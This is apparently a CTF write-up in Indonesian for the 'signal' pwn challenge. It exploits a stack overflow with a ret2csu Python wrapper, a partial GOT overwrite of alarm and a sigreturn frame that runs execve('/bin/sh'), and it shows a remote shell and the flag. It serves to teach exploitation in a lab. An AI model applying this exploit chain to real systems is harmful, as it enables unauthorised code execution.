# signal


## Analisa


Diberikan program dengan proteksi:
```
$ file signal; checksec signal
signal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=94bc0b46110ac301a681697ba5167afa696c2144, not stripped
[*] '/home/tempest/projects/cscctf/2019/qual/pwn/signal/signal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Bug merupakan stack bof pada fungsi `main`.


## Eksploitasi


Ketiadaan fungsi print membuat eksploitasi menjadi sulit. Tetapi masih ada fungsi `__libc_csu_init` yang dapat kita gunakan (gadget+teknik ini disebut ***ret2csu***):
```
00000000004006f0 <__libc_csu_init>:
  ...
  400730:	4c 89 fa             	mov    rdx,r15
  400733:	4c 89 f6             	mov    rsi,r14
  400736:	44 89 ef             	mov    edi,r13d
  400739:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  40073d:	48 83 c3 01          	add    rbx,0x1
  400741:	48 39 dd             	cmp    rbp,rbx
  400744:	75 ea                	jne    400730 <__libc_csu_init+0x40>
  400746:	48 83 c4 08          	add    rsp,0x8
  40074a:	5b                   	pop    rbx
  40074b:	5d                   	pop    rbp
  40074c:	41 5c                	pop    r12
  40074e:	41 5d                	pop    r13
  400750:	41 5e                	pop    r14
  400752:	41 5f                	pop    r15
  400754:	c3                   	ret    

gef> x/3i 0x400751
   0x400751 <__libc_csu_init+97>:	pop    rsi
   0x400752 <__libc_csu_init+98>:	pop    r15
   0x400754 <__libc_csu_init+100>:	ret    
gef> x/2i 0x400753
   0x400753 <__libc_csu_init+99>:	pop    rdi
   0x400754 <__libc_csu_init+100>:	ret    
```


Wrapper untuk ret2csu:
```Python
def call_ptr(target,edi,rsi,rdx,rbx_after=0,rbp_after=0,r12_after=0,r13_after=0,r14_after=0,r15_after=0):
	payload = p64(0x40074a)
	payload += p64(0)
	payload += p64(1)
	payload += p64(target)
	payload += p64(edi)
	payload += p64(rsi)
	payload += p64(rdx)
	payload += p64(0x400730)
	payload += p64(0) # add rsp, 8
	payload += p64(rbx_after)
	payload += p64(rbp_after)
	payload += p64(r12_after)
	payload += p64(r13_after)
	payload += p64(r14_after)
	payload += p64(r15_after)
	return payload
```



Kita dapat memanggil fungsi **read** dan **alarm** melalui GOT dengan semua parameter (rdi,rsi,rdx) dibawah kendali kita melalui *0x40074a* dan *0x400730* . Tujuan diberikan libc adalah agar peserta dapat melihat LSB dari fungsi libc **read** dan **alarm**. Berikut disassemblynya:
```
gef> x/2i alarm
   0x7f9a9e3d4840 <alarm>:	mov    eax,0x25
   0x7f9a9e3d4845 <alarm+5>:	syscall 
gef> x/8i read
   ...
   0x7f9a9e40007d <__GI___libc_read+13>:	xor    eax,eax
   0x7f9a9e40007f <__GI___libc_read+15>:	syscall
   ...
```


Jika kita melakukan overwrite LSB dari GOT **alarm**, kita dapat melakukan arbitrary syscall dengan arbitrary parameter. Artinya kita bisa langsung mengeksekusi `execve("/bin/sh")` di program tanpa leak.
```Python
payload = call_ptr(exe.got["read"],0,exe.got["read"],1,rbp_after=0x601590)
```


Intended solution adalah dengan menggunakan syscall ini untuk melakukan `Sigreturn ROP`. Pertama-tama untuk set register `rax`, kita dapat menggunakan gadget:
```
gef> x/3i 0x4006db
   0x4006db <main+57>:	mov    rax,QWORD PTR [rbp-0x108]
   0x4006e2 <main+64>:	leave  
   0x4006e3 <main+65>:	ret 
```


set register `rbp` ke `.bss` dan kita bisa mengambil nilai 0. Selanjutnya lakukan read melalui ret2csu untuk set register rax ke 15 (sigreturn).

```Python
payload += p64(0x4006db) # mov rax, [rbp-0x108]; leave; ret
payload += call_ptr(exe.got["read"],0,0x601910,15,rbp_after=0x601610)
payload += p64(exe.plt["read"]) # ... ; syscall; ...; ret
frame = SigreturnFrame()
frame.rax = 0x3b # execve
frame.rdi = 0x601910 # "/bin/sh"
frame.rsp = 0x601a10
frame.rip = exe.plt["read"] # syscall
payload += str(frame)
```
Dalam frame sigreturn (tersedia melalui modul [pwntools](https://github.com/Gallopsled/pwntools)) ini, kita set parameter yang diperlukan (sisanya akan dinullkan).


Output script:
```
$ python exploit.py go
[*] '/home/tempest/projects/cscctf/2019/qual/pwn/signal/signal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to signal.problem.cscctf.com on port 11112: Done
[*] Switching to interactive mode
$ cat /home/signal/flag
CCC{SsSSssSSsss55sS5SsssssssssSR0P}
$ 
[*] Closed connection to signal.problem.cscctf.com port 11112
```
